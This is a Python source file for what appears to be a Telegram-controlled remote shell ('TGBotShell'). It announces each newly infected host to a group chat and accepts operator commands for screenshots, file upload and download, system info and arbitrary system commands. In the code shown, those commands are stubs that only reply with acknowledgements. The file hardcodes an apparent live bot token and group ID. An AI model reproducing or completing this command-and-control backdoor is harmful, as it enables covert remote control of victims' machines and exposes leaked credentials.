import re
import time
import uuid
import requests


class CommonSet:
    def __init__(self):
        pass

    def logger(self):
        pass


class TGBotShell:
    def __init__(self, tgbot_token):
        self.TGBotToken = tgbot_token
        self.UUID = None
        self.tg_info = None
        self.ReConn_Max = 5
        self.ReConn_Time = 60
        self.ChatName = "@xiaokunyihaoBot"
        self.GroupID = "-1002035867279"
        self.UserID = {}
        self.offset = None

    def get_chat_members(self):
        try:
            data = requests.get(
                f"https://api.telegram.org/bot{self.TGBotToken}/getChatAdministrators?chat_id={self.GroupID}").json()
        except Exception as e:
            print(404, "发生错误：", e)
        else:
            if data["ok"] and 'result' in data:
                members = data['result']
                # 提取每个成员的用户ID
                for member in members:
                    if not member['user']['is_bot'] and member['user']['id'] not in self.UserID:
                        self.UserID[member['user']['id']] = member['user']["username"]
            else:
                print("Failed to get chat members.")

    def getUpdates(self):
        if self.offset is None:
            param = False
        else:
            param = {'offset': self.offset + 1, 'timeout': 30}
        try:
            response = requests.get(f"https://api.telegram.org/bot{self.TGBotToken}/getUpdates",
                                    params=param).json()
        except Exception as e:
            return 404, f"获取最新数据失败：{e}"
        else:
            if self.offset is None and response["ok"] and len(response['result']) > 0 and response['result'][-1]['update_id'] != "":
                self.offset = response['result'][-1]['update_id']
            if response["ok"] and len(response['result']) > 0:
                updates = []
                for item in response['result']:
                    if item['message']['from']['is_bot'] is False and item['message']['from']['id'] in self.UserID:
                        if item["message"]["chat"]["type"] == "supergroup":
                            matches = re.search(f"{self.ChatName}\s*(.*)", str(item['message']['text']))
                        else:
                            matches = re.search(f"(.*)", str(item['message']['text']))
                        if matches:
                            matches = matches.group(1).split(" ")
                            if matches[0].replace(" ","") == str(self.UUID):
                                shell_text = ' '.join(matches[1:]).lstrip(" ")
                                updates.append({'chatid': item['message']['chat']['id'],
                                                'username': [item['message']['from']['id']],
                                                'text': shell_text})
                        self.offset = response['result'][-1]['update_id']
                return updates
            else:
                return False

    def send_chat_msg(self, updates):
        msg = ""
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        msg += "\n" + updates["text"]
        try:
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendMessage?chat_id={updates['chatid']}&text={msg}")
        except:
            pass

        # response = requests.post(f"https://api.telegram.org/bot{self.TGBotToken}/sendVideo",
        #                          params={"chat_id": self.tg_info["message"]["chat"]["id"]}, files=files,
        #                          headers={'Content-Type': 'video/mp4'}).json()
        # if response["ok"]:
        #     self.tg_info = response["result"]
        #     print(response)
        # else:
        #     print('发送失败')

    def handler_center(self, updates):
        for item_user in updates:
            cmd_list = str(item_user["text"]).split(" ")
            print(cmd_list)
            if cmd_list[0] == "set":
                if cmd_list[1] == "uuid":
                    self.UUID = cmd_list[2].replace(" ","")
                    self.send_chat_msg(
                        {"chatid": self.GroupID, "username": item_user['username'],
                         "text": f"主机：{self.UUID}\n已成功更新UUID会话标识！"})
                else:
                    self.send_chat_msg(
                        {"chatid": self.GroupID, "username": item_user['username'],
                         "text": f"主机：{self.UUID}\n该命令 {cmd_list} 并不存在，请输入命令 /help 后查看语法！"})
            elif cmd_list[0] == "screenshot":
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行screenshot！"})
            elif cmd_list[0] == "upload":
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行upload！"})
            elif cmd_list[0] == "download":
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行download！"})
            elif cmd_list[0] == "cd":
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行cd！"})
            elif cmd_list[0] == "getinfo":
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行getinfo！"})
            else:
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行系统命令！"})

    def main(self):
        self.UUID = uuid.uuid4()
        flag = False
        while True:
            self.get_chat_members()
            if not flag:
                flag = True
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": self.UserID, "text": f"新的主机上线！UUID：{self.UUID}"})
            updates = self.getUpdates()
            if updates:
                self.handler_center(updates)
            time.sleep(1)


if __name__ == '__main__':
    NewTgbot = TGBotShell(tgbot_token="7145600460:AAH8H9zt4jRe3Pog6WWfEUstiHFIvYI4ke8").main()
